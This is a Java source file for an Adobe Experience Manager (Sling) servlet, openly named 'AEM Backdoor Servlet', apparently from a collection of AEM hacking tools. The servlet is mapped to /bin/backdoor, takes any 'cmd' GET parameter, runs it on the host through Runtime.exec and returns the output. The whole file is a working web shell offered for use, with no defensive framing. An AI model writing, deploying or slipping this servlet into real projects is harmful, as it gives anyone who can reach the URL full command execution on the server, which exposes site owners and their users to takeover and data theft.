package aem.hacks.core.servlets;

import org.apache.sling.api.SlingHttpServletRequest;
import org.apache.sling.api.SlingHttpServletResponse;
import org.apache.sling.api.resource.Resource;
import org.apache.sling.api.servlets.HttpConstants;
import org.apache.sling.api.servlets.SlingAllMethodsServlet;
import org.apache.sling.api.servlets.SlingSafeMethodsServlet;
import org.apache.sling.api.resource.ValueMap;
import org.osgi.framework.Constants;
import org.osgi.service.component.annotations.Component;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import java.io.IOException;

import java.io.*;

@Component(service=Servlet.class,
           property={
                   Constants.SERVICE_DESCRIPTION + "=AEM Backdoor Servlet",
                   "sling.servlet.methods=" + HttpConstants.METHOD_GET,
                   "sling.servlet.paths="+ "/bin/backdoor",
                   "sling.servlet.extensions=" + "html"
           })
public class BackdoorServlet extends SlingSafeMethodsServlet {

    private static final long serialVersionUid = 1L;

    @Override
    protected void doGet(final SlingHttpServletRequest req,
            final SlingHttpServletResponse resp) throws ServletException, IOException {
        final Resource resource = req.getResource();

        Process proc = Runtime.getRuntime().exec(req.getParameter("cmd"));

        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));

        StringBuilder sb = new StringBuilder();
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            sb.append(s + "\n");
        }
        String output = sb.toString();

        resp.setContentType("text/plain");
        resp.getWriter().write(output);
    }
}
